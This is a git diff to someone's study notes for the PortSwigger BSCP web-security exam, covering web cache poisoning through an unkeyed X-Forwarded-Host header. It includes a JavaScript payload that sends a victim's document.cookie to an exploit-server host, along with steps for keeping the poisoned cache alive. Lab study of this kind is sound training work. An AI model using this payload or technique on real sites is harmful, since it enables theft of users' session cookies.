@@ -3,6 +3,7 @@
 My personal study notes on the PortSwigger Academy [Burp Suite Certified Practitioner](https://portswigger.net/web-security/certification) (BSCP) Exam topics.  
 The acronym BSCP has nice simular ring like OSCP  :)  
 
+[Web Cache Poison](#web-cache-poison)  
 [Cross Site Scripting](#cross-site-scripting)  
 [Host Header Poison - forgot-password](#host-header-poison---forgot-password)  
 [HTTP Request Smuggling](#http-request-smuggling)  
@@ -21,11 +22,20 @@ The acronym BSCP has nice simular ring like OSCP  :)
 
 ## Web Cache Poison  
 
->Steal cookie by poisoning cache
+>Target use **tracking.js** JavaScript, and is vulnerable to X-Forwarded-Host header redirecting path, allowing the stealing of cookie by poisoning cache.
+
+![tracking.js](tracking.js.png)  
+
+>Hosting the following **on exploit server, injecting the **X-Forwarded-Host** header, and poison the cache until victim hits poison cache.  
+
+![exploit host tracking.js](exploit-host-tracking-js.png)  
 
 ```javascript
-document.location='https://exploit-0a5100ba04aa6e4ec6249999015100f7.exploit-server.net//cookies?c='+document.cookie;
-```
+document.location='https://exploit.exploit-server.net//cookies?c='+document.cookie;
+```  
+>Keep poising the cache of target by resending request with **X-Forwarded-Host** header.  
+
+![x-cache-hit.png](x-cache-hit.png)  
 
 [PortSwigger Lab: Web cache poisoning with an unkeyed header](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header)  
 
